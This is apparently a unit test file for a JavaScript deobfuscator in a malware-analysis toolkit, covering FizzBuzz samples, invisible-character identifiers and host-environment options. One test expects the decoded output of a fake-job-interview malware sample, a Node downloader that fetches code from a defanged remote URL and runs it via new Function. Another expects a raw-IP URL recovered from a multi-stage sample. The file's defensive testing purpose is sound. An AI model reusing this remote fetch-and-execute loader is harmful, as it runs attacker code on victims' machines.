from .. import TestUnitBase

import inspect


class TestJsDeobfuscator(TestUnitBase):

    def test_obfuscated_fizzbuzz_01(self):
        data = self.download_sample('0fd7c8302457d9d9099282439d8413d9122a5d3cff3467d5042e51fc1156fa5b')
        test = data | self.load() | str
        self.assertEqual(
            "console.log([1, 2, 'Fizz', 4, 'Buzz', 'Fizz', 7, 8, 'Fizz', 'Buzz',"
            " 11, 'Fizz', 13, 14, 'FizzBuzz', 16, 17, 'Fizz', 19, 'Buzz']);",
            test,
        )

    def test_obfuscated_fizzbuzz_02(self):
        data = self.download_sample('add3c81c1c408baf46cec9daf3fbf025df6960072be53776291142da6f3472d9')
        test = data | self.load() | str
        goal = inspect.cleandoc(
            '''
            function dJ_rQ_R(ViBA8K, txDwfK = [], wHsINo) {
              for (wHsINo = 0x1; wHsINo <= ViBA8K; wHsINo++) {
                if (wHsINo % 0xf === 0x0) {
                  txDwfK.push('FizzBuzz');
                } else {
                  if (wHsINo % 0x3 === 0x0) {
                    txDwfK.push('Fizz');
                  } else {
                    if (wHsINo % 0x5 === 0x0) {
                      txDwfK.push('Buzz');
                    } else {
                      txDwfK.push(wHsINo);
                    }
                  }
                }
              }
              return txDwfK;
            }
            console.log(dJ_rQ_R(0x14));
            '''
        )
        self.assertEqual(test, goal)

    def test_obfuscated_fizzbuzz_03(self):
        data = self.download_sample('369b73eaf8ce6387ecf2f9c14ab968184c34a975cbc1bc04bf415f9adc952f26')
        test = data | self.load() | str
        # globalThis.console is the sound reduction: console is a host global, not spec-mandated, so
        # collapsing globalThis.console to bare console would turn undefined into a ReferenceError.
        self.assertEqual(
            "globalThis.console.log([1, 2, 'Fizz', 4, 'Buzz', 'Fizz', 7, 8, 'Fizz', 'Buzz',"
            " 11, 'Fizz', 13, 14, 'FizzBuzz', 16, 17, 'Fizz', 19, 'Buzz']);",
            test,
        )

    def test_a_name_holding_a_zero_width_non_joiner_keeps_the_value_it_computes(self):
        """
        A zero width non-joiner is an identifier character, and an obfuscator reaches for one
        because nothing renders it. Node prints `7` for this script, whose one function returns its
        argument plus one; the name is assembled from `chr` so that no invisible character stands
        in this file.
        """
        non_joiner = chr(0x200C)
        data = (
            F'function f(a{non_joiner}b) {{ return a{non_joiner}b + 1; }} console.log(f(6));'
        ).encode('utf8')
        self.assertEqual('console.log(7);', data | self.load() | str)

    def test_host_entrypoint_survives_removal(self):
        """
        A JXA script exposes `run` for the host to invoke and never calls it itself, so reachability over
        the file alone deletes it — and with it everything only it reached, which here is the whole file.
        Naming it on the command line keeps it together with the binding and helper it uses, while the
        function nothing reaches is still removed.
        """
        data = inspect.cleandoc(
            """
            var config = 'payload';
            function decode(s) { return s.toUpperCase(); }
            function run() { return decode(config); }
            function junk() { return 'unused'; }
            """
        ).encode('utf8')
        self.assertEqual('', data | self.load() | str)
        self.assertEqual(
            inspect.cleandoc(
                """
                var config = 'payload';
                function decode(s) {
                  return s.toUpperCase();
                }
                function run() {
                  return decode(config);
                }
                """
            ),
            data | self.load('run') | str,
        )

    def test_fake_job_interview_downloader(self):
        data = self.download_sample('02c480dd94fac8e5d80d991a1c16903953efe06f87e72fe3af77cb9e03e2e645')
        test = data | self.load() | str
        self.assertEqual(test, inspect.cleandoc(
            """
            const a0H = require('axios');
            async function a0w() {
              const H = (await a0H.get('[[URL]]')).data.sessions, w = new Function(
                'require',
                'module',
                'exports',
                '__dirname',
                '__filename',
                H
              );
              w(require, module, exports, __dirname, __filename);
            }
            a0w();
            """.replace('[[URL]]', 'https'':''//lhockerline''.s''.gy/''1460d20e7505bb18')
        ))

    def test_multi_decoder_stage_sample(self):
        data = self.download_sample('2ab831e4650b36d399bf1e923ae1a2cb53ce93e5e9d2e5427103b750b0e6cf26')
        test = data | self.load() | str
        self.assertIn('33ff3edaf55a8e03dcbc7cb40d498a49', test)
        self.assertIn('http'':/''/23.27.20''.187', test)


class TestJsHostEnvironmentPin(TestUnitBase):
    """
    The `-e` switch pins the host, so a bare read of a name that host defines is resolved and the folds
    it enables are recovered. The default keeps such a read, since no universal host defines it.
    """

    def test_a_node_finder_that_returns_global_folds_to_nothing_when_pinned(self):
        source = b'function g() { return global; } g();'
        self.assertEqual(
            source | self.load() | str,
            'function g() {\n  return global;\n}\ng();',
        )
        self.assertEqual(source | self.load(environment='node') | str, '')

    def test_a_node_host_collapses_a_global_alias_member_read(self):
        source = b'console.log(global.String);'
        self.assertEqual(source | self.load() | str, 'console.log(global.String);')
        self.assertEqual(source | self.load(environment='node') | str, 'console.log(String);')

    def test_a_node_host_collapses_a_cross_alias_global_property_read(self):
        second_alias = b'globalThis._V = 1;\nfunction f() { return global._V; }\nf();\nconsole.log(1);'
        self.assertEqual(
            second_alias | self.load(environment='node') | str,
            'globalThis._V = 1;\nfunction f() {\n  return _V;\n}\nf();\nconsole.log(1);',
        )
        bare_assignment = b'foo = 1;\nfunction f() { return global.foo; }\nf();\nconsole.log(1);'
        self.assertEqual(
            bare_assignment | self.load(environment='node') | str,
            'foo = 1;\nfunction f() {\n  return foo;\n}\nf();\nconsole.log(1);',
        )

    def test_a_browser_host_inlines_an_indirect_eval_through_a_same_realm_alias(self):
        window_eval = b"window.eval('console.log(1);');"
        self.assertEqual(window_eval | self.load() | str, "window.eval('console.log(1);');")
        self.assertEqual(window_eval | self.load(environment='browser') | str, 'console.log(1);')

    def test_a_cross_realm_alias_indirect_eval_is_kept_even_when_pinned(self):
        top_eval = b"top.eval('console.log(1);');"
        self.assertEqual(top_eval | self.load(environment='browser') | str, "top.eval('console.log(1);');")

    def test_an_unknown_host_keyword_is_a_usage_error(self):
        with self.assertRaises(Exception):
            self.load(environment='mainframe')
